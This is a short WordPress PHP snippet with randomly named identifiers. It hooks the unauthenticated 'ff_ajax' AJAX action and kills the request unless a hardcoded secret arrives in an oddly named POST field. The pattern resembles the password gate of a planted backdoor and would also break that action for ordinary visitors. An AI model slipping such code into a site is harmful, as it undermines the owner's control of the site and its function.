<?php

function keywords_badge_bootstrap_exchange() {
	if (!isset($_POST["pqfflqved"]) || $_POST["pqfflqved"] !== "iXfGIoLqdu9") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'keywords_badge_bootstrap_exchange', 5, 1);
